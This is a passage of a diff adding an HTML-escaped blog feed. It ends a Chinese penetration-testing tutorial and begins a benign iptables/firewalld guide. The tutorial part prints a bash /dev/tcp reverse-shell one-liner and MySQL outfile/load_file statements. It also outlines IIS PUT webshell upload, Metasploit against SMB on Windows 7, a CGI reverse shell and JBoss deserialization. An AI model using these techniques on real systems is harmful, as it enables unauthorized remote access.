+/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/dest_ip 8080 0&amp;gt;&amp;amp;1 //服务器执行
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-20-2&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-20-2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;20.2&lt;/span&gt; 通过mysql服务向web目录读写文件&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-20-2&quot;&gt;
+&lt;p&gt;
+通过暴力破解获取远程mysql服务器登录权限，在数据库权限足够高的情况下可以读写网站的相关文件。
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+select 'test string' into outfile 'C:\www\jsf.php';
+select load_file('C:\www\jsf.php');
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-20-3&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-20-3&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;20.3&lt;/span&gt; IIS put漏洞使用&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-20-3&quot;&gt;
+&lt;p&gt;
+我们可以使用工具去扫描网站是否支持http put方法，如果检测发现能够使用put方法，我们就可以针对服务器进行进一步的攻击，我们可以上传恶意文件，然后可以进行修改文件信息等的操作。首先如图，
+我们针对目标服务器进行扫描。
+&lt;/p&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/putscanner.png&quot; alt=&quot;putscanner.png&quot;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;figure-number&quot;&gt;Figure 10:&lt;/span&gt; 进行服务器put扫描&lt;/p&gt;
+&lt;/div&gt;
+
+&lt;p&gt;
+扫描到可以使用的put服务器之后，我们进一步针对某个页面查看，这个页面支持那些http方法，如图
+&lt;/p&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/httpoption.png&quot; alt=&quot;httpoption.png&quot;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;figure-number&quot;&gt;Figure 11:&lt;/span&gt; 查看页面option&lt;/p&gt;
+&lt;/div&gt;
+
+
+&lt;p&gt;
+然后，在本地准备一个名称jsfput.txt的文本文件，其中文件的内容为：
+&lt;/p&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/aspscript.png&quot; alt=&quot;aspscript.png&quot;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;figure-number&quot;&gt;Figure 12:&lt;/span&gt; 服务器上传脚本文件内容&lt;/p&gt;
+&lt;/div&gt;
+
+&lt;p&gt;
+接着在工具中我们选择使用put方法，将本地制作好的文件上传到服务器中，如图
+&lt;/p&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/putfile.png&quot; alt=&quot;putfile.png&quot;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;figure-number&quot;&gt;Figure 13:&lt;/span&gt; put文件至服务器&lt;/p&gt;
+&lt;/div&gt;
+
+&lt;p&gt;
+再使用move方法，将我们已经上传至服务器中的文件进行文件名称更改
+&lt;/p&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/filemove.png&quot; alt=&quot;filemove.png&quot;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;figure-number&quot;&gt;Figure 14:&lt;/span&gt; 脚本文件名称修改&lt;/p&gt;
+&lt;/div&gt;
+
+&lt;p&gt;
+名称修改成功之后，我们可以在菜刀软件中可以添加服务器中的脚本文件路径，并且在密码输入框中输入我们在脚本文件中定义好的密码字符，在下面选择相应的服务器执行语言后，点击添加，最后我们右键新输入的条目，就可以选择相应的功能。如文件浏览，虚拟终端等。
+&lt;/p&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/caidao.png&quot; alt=&quot;caidao.png&quot;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;figure-number&quot;&gt;Figure 15:&lt;/span&gt; 将已攻击的网站信息添加到菜刀软件中&lt;/p&gt;
+&lt;/div&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/caidaofile.png&quot; alt=&quot;caidaofile.png&quot;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;figure-number&quot;&gt;Figure 16:&lt;/span&gt; 浏览网站文件&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+
+&lt;div id=&quot;outline-container-sec-20-4&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-20-4&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;20.4&lt;/span&gt; Metasploit 渗透Windos7&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-20-4&quot;&gt;
+&lt;p&gt;
+使用metasploit可以方便的进行渗透实验，我们可以在kaililinux操作系统中使用已经安装好的工具
+metasploit来对某些主机进行渗透实验，在本实验中我们选择一台主机作为被攻击对象，首先使用工具
+nmap来查看目标主机开发了那些服务，然后我们就可以针对开启的服务进行选择性的攻击。
+&lt;/p&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/nmap.png&quot; alt=&quot;nmap.png&quot;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;figure-number&quot;&gt;Figure 17:&lt;/span&gt; 扫描端口&lt;/p&gt;
+&lt;/div&gt;
+
+&lt;p&gt;
+我们可以从中发现在目标主机中开启了445端口，然后我们可以针对这个漏洞做一些操作，按照下面的步骤我们就可以进入远程主机。
+&lt;/p&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/use.png&quot; alt=&quot;use.png&quot; width=&quot;85%&quot;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;figure-number&quot;&gt;Figure 18:&lt;/span&gt; 设置&lt;/p&gt;
+&lt;/div&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/setRhost.png&quot; alt=&quot;setRhost.png&quot;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;figure-number&quot;&gt;Figure 19:&lt;/span&gt; 设置远程主机&lt;/p&gt;
+&lt;/div&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/exploit.png&quot; alt=&quot;exploit.png&quot; width=&quot;85%&quot;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;figure-number&quot;&gt;Figure 20:&lt;/span&gt; 开始进行渗透&lt;/p&gt;
+&lt;/div&gt;
+
+&lt;p&gt;
+经过上面的操作我们可以看到kalilinux已经和目标主机之间建立了通行，接下来我们就可以查看目标主机的信息并且获取目标主机shell权限来执行一些脚本。
+&lt;/p&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/sysinfo.png&quot; alt=&quot;sysinfo.png&quot;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;figure-number&quot;&gt;Figure 21:&lt;/span&gt; 查看系统信息&lt;/p&gt;
+&lt;/div&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/script.png&quot; alt=&quot;script.png&quot;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;figure-number&quot;&gt;Figure 22:&lt;/span&gt; 执行脚本&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-20-5&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-20-5&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;20.5&lt;/span&gt; .cgi为文件后缀名漏洞使用&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-20-5&quot;&gt;
+&lt;p&gt;
+如果发现网站上有.cgi为后缀名称的文件时，我们可以尝试使用反弹shell利用，在本机执行如下两条命令之后，我们就有可能获取到服务器的shell权限。
+&lt;/p&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/ncshell.png&quot; alt=&quot;ncshell.png&quot;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;figure-number&quot;&gt;Figure 23:&lt;/span&gt; 打开本地监听端口&lt;/p&gt;
+&lt;/div&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/cgishell.png&quot; alt=&quot;cgishell.png&quot; width=&quot;85%&quot;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;figure-number&quot;&gt;Figure 24:&lt;/span&gt; 漏洞利用远程主机连接至本地监听&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-20-6&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-20-6&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;20.6&lt;/span&gt; jboss java反序列化工具使用&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-20-6&quot;&gt;
+&lt;p&gt;
+当我们发现在服务器上使用了jboss软件服务时，我们就可以尝试使用这个工具去尝试对网站进行一些信息的收集、命令执行及webshell上传等操作。
+&lt;/p&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/jbossjava.png&quot; alt=&quot;jbossjava.png&quot;&gt;
+&lt;/p&gt;
+&lt;/div&gt;
+
+
+
+&lt;!-- more-forword --&gt;
+
+
+&lt;!-- more --&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;</content><author><name>jsf</name></author><category term="Shell" /><category term="Dos" /><category term="PHP" /><category term="Mysql" /></entry><entry><title type="html">Linux防火墙</title><link href="http://localhost:4000/linux/2019/01/07/linux%E9%98%B2%E7%81%AB%E5%A2%99/" rel="alternate" type="text/html" title="Linux防火墙" /><published>2019-01-07T00:00:00+08:00</published><updated>2019-01-07T00:00:00+08:00</updated><id>http://localhost:4000/linux/2019/01/07/linux%E9%98%B2%E7%81%AB%E5%A2%99</id><content type="html" xml:base="http://localhost:4000/linux/2019/01/07/linux%E9%98%B2%E7%81%AB%E5%A2%99/">&lt;div id=&quot;outline-container-sec-1&quot; class=&quot;outline-2&quot;&gt;
+&lt;h2 id=&quot;sec-1&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; Linux防火墙&lt;/h2&gt;
+&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
+&lt;p&gt;
+防火墙依据策略可以对经过防火墙的流量进行过滤。防火墙的策略可以基于源目的地址、端口号、协议、
+应用信息等来制定策略，通过匹配预先制定的规则对流量进行相应的处理。在早期的linux系统中使用
+iptables来作为定义防火墙策略的管理工具，而在新的系统中加入了firewalld。它们并不是真正的防火墙，iptables服务会将预先配置好的防火墙策略交由内核层面的netfilter网络过滤器来处理，而
+firewalld服务会将配置好的防火墙策略交由内核层面的nftables包过滤框架来处理。
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-1-1&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-1-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; iptables&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
+&lt;p&gt;
+iptables是早期linux中默认使用的防火墙配置管理服务，目前依然后很多系统中仍然使用iptables。
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-1-1-1&quot; class=&quot;outline-4&quot;&gt;
+&lt;h4 id=&quot;sec-1-1-1&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;1.1.1&lt;/span&gt; 规则&lt;/h4&gt;
+&lt;div class=&quot;outline-text-4&quot; id=&quot;text-1-1-1&quot;&gt;
+&lt;p&gt;
+规则是系统管理员定义的条件，规则分别指定了源目标地址、传输协议(tcp,udp,icmp)及服务类型
+(http,ftp,ssh)等，当数据包与规则相匹配时，就根据所定义的方法来处理这些数据包，如accept、
+reject、drop。
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-1-1-2&quot; class=&quot;outline-4&quot;&gt;
+&lt;h4 id=&quot;sec-1-1-2&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;1.1.2&lt;/span&gt; 链&lt;/h4&gt;
+&lt;div class=&quot;outline-text-4&quot; id=&quot;text-1-1-2&quot;&gt;
+&lt;p&gt;
+多条规则可以形成一个链。
+&lt;/p&gt;
+
+&lt;p&gt;
+五链：
+&lt;/p&gt;
+&lt;ol class=&quot;org-ol&quot;&gt;
+&lt;li&gt;INPUT链：进来的数据包应用此规则链中的策略
+&lt;/li&gt;
+&lt;li&gt;OUTPUT链：出去的数据包应用此规则链中的策略
+&lt;/li&gt;
+&lt;li&gt;FORWARD链：转发数据包应用此规则链中的策略
+&lt;/li&gt;
+&lt;li&gt;PREROUTING链：在对数据包做路由选择之前应用此规则链中的策略
+&lt;/li&gt;
+&lt;li&gt;POSTROUTING链：在对数据包做路由选择之后应用此规则链中的策略
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-1-1-3&quot; class=&quot;outline-4&quot;&gt;
+&lt;h4 id=&quot;sec-1-1-3&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;1.1.3&lt;/span&gt; 表&lt;/h4&gt;
+&lt;div class=&quot;outline-text-4&quot; id=&quot;text-1-1-3&quot;&gt;
+&lt;p&gt;
+表提供了特定的功能，用于实现包过滤、网络地址转换及包重构功能，表中的规则写在链上面。
+&lt;/p&gt;
+
+&lt;p&gt;
+四表：
+&lt;/p&gt;
+&lt;ol class=&quot;org-ol&quot;&gt;
+&lt;li&gt;filter表：数据包过滤
+&lt;/li&gt;
+&lt;li&gt;Nat表：网络地址转换（IP、port）
+&lt;/li&gt;
+&lt;li&gt;Mangle表：修改数据包的服务类型、ttl，可以配置路由实现qos
+&lt;/li&gt;
+&lt;li&gt;Raw表：决定数据包是否被状态跟踪机制处理
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-1-1-4&quot; class=&quot;outline-4&quot;&gt;
+&lt;h4 id=&quot;sec-1-1-4&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;1.1.4&lt;/span&gt; iptables常用参数及作用&lt;/h4&gt;
+&lt;div class=&quot;outline-text-4&quot; id=&quot;text-1-1-4&quot;&gt;
+&lt;table&gt;
+
+
+&lt;colgroup&gt;
+&lt;col  class=&quot;left&quot;&gt;
+
+&lt;col  class=&quot;left&quot;&gt;
+&lt;/colgroup&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th scope=&quot;col&quot; class=&quot;left&quot;&gt;参数&lt;/th&gt;
+&lt;th scope=&quot;col&quot; class=&quot;left&quot;&gt;作用&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;-F&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;清空规则链&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;-L&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;查看规则链&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;-A&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;在规则链的末尾加入新规则&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;-I num&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;在规则链的头部加入新规则&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;-D num&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;删除某一条规则&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;-s&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;匹配来源地址IP/MASK，加叹号“!”表示除这个IP外&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;-d&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;匹配目标地址&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;-i 网卡名称&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;匹配从这块网卡流入的数据&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;-o 网卡名称&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;匹配从这块网卡流出的数据&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;-p&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;匹配协议，如TCP、UDP、ICMP&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;&amp;#x2013;dport num&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;匹配目标端口号&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;&amp;#x2013;sport num&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;匹配来源端口号&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-1-1-5&quot; class=&quot;outline-4&quot;&gt;
+&lt;h4 id=&quot;sec-1-1-5&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;1.1.5&lt;/span&gt; iptables命令示例：&lt;/h4&gt;
+&lt;div class=&quot;outline-text-4&quot; id=&quot;text-1-1-5&quot;&gt;
+&lt;p&gt;
+1、清空防火墙规则链及查看
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+iptables -F
+iptables -L
+&lt;/pre&gt;
+&lt;p&gt;
+2、设置转发规则链默认策略为拒绝
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+iptables -P FORWARD DROP
+&lt;/pre&gt;
+&lt;p&gt;
+3、INPUT链中添加ICMP流量进入的策略规则
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+iptables -A INPUT -p icmp -j ACCEPT
+&lt;/pre&gt;
+&lt;p&gt;
+4、INPUT链中添加允许指定网段主机访问本机ssh服务，并拒绝其它主机访问ssh服务
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+iptables -I INPUT -s 192.168.1.0/24 -p tcp --dport 22 -j ACCEPT
+iptables -I INPUT -p tcp --dport 22 -j REJECT
+&lt;/pre&gt;
+&lt;p&gt;
+5、删除INPUT链中的某条规则
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+iptables -D INPUT 1
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-1-2&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-1-2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.2&lt;/span&gt; firewalld&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-2&quot;&gt;
+&lt;p&gt;
+firewalld支持动态更新并加入了区域概念。
+&lt;/p&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-1-2-1&quot; class=&quot;outline-4&quot;&gt;
+&lt;h4 id=&quot;sec-1-2-1&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;1.2.1&lt;/span&gt; firewalld常用区域名及策略规则&lt;/h4&gt;
+&lt;div class=&quot;outline-text-4&quot; id=&quot;text-1-2-1&quot;&gt;
+&lt;table&gt;
+
+
+&lt;colgroup&gt;
+&lt;col  class=&quot;left&quot;&gt;
+
+&lt;col  class=&quot;left&quot;&gt;
+&lt;/colgroup&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;区域&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;默认规则策略&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;trusted&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;允许所有数据包&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;home&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;拒绝流入的流量，如果流量与ssh、mdns、ipp-client、amba-client与dhcpv6-client服务相关，则允许流量&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;internal&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;等同于home区域&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;work&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;拒绝流入的流量如果流量与ssh、mdns、ipp-client、amba-client与dhcpv6-client服务相关，则允许流量&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;public&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;拒绝流入的流量，而如果流量与ssh、dhcpv6-client服务相关，则允许流量&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;external&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;拒绝流入的流量，而如果流量与ssh服务相关，则允许流量&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;dmz&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;拒绝流入的流量，而如果流量与ssh服务相关，则允许流量&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;block&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;拒绝流入的流量&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;drop&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;拒绝流入的流量&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-1-2-2&quot; class=&quot;outline-4&quot;&gt;
+&lt;h4 id=&quot;sec-1-2-2&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;1.2.2&lt;/span&gt; firewalld-cmd命令常用参数及作用&lt;/h4&gt;
+&lt;div class=&quot;outline-text-4&quot; id=&quot;text-1-2-2&quot;&gt;
+&lt;table&gt;
+
+
+&lt;colgroup&gt;
+&lt;col  class=&quot;left&quot;&gt;
+
+&lt;col  class=&quot;left&quot;&gt;
+&lt;/colgroup&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;参数&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;作用&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;&amp;#x2013;get-default-zone&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;查询默认的区域名称&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;&amp;#x2013;set-default-zone=&amp;lt;区域名称&amp;gt;&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;设置默认的区域，使其永久生效&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;&amp;#x2013;get-zones&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;显示可用的区域&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;&amp;#x2013;get-services&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;显示预先定义的服务&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;&amp;#x2013;get-active-zones&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;显示当前正在使用的区域与网卡名称&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;&amp;#x2013;add-source=&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;将源自此IP或子网的流量导向指定的区域&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;&amp;#x2013;remove-source=&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;不再将源自此IP或子网的流量导向某个指定区域&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;&amp;#x2013;add-interface=&amp;lt;网卡名称&amp;gt;&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;将源自该网卡的所有流量都导向某个指定区域&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;&amp;#x2013;change-interface=&amp;lt;网卡名称&amp;gt;&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;将某个网卡与区域进行关联&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;&amp;#x2013;list-all&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;显示当前区域的网卡配置参数、资源、端口以及服务等信息&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;&amp;#x2013;list-all-zones&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;显示所有区域的网卡配置参数、资源、端口以及服务等信息&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;&amp;#x2013;add-service=&amp;lt;服务名&amp;gt;&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;设置默认区域允许该服务的流量&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;&amp;#x2013;add-port=&amp;lt;端口号/协议&amp;gt;&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;设置默认区域允许该端口的流量&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;&amp;#x2013;remove-service=&amp;lt;服务名&amp;gt;&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;设置默认区域不再允许该服务的流量&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;&amp;#x2013;remove-port=&amp;lt;端口号/协议&amp;gt;&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;设置默认区域不再允许该端口的流量&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;&amp;#x2013;reload&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;让“永久生效”的配置规则立即生效，并覆盖当前的配置规则&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;&amp;#x2013;panic-on&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;开启应急状况模式&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td class=&quot;left&quot;&gt;&amp;#x2013;panic-off&lt;/td&gt;
+&lt;td class=&quot;left&quot;&gt;关闭应急状况模式&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-1-2-3&quot; class=&quot;outline-4&quot;&gt;
+&lt;h4 id=&quot;sec-1-2-3&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;1.2.3&lt;/span&gt; firewalld-cmd命令示例&lt;/h4&gt;
+&lt;div class=&quot;outline-text-4&quot; id=&quot;text-1-2-3&quot;&gt;
+&lt;p&gt;
+1、查看运行状态
+&lt;/p&gt;
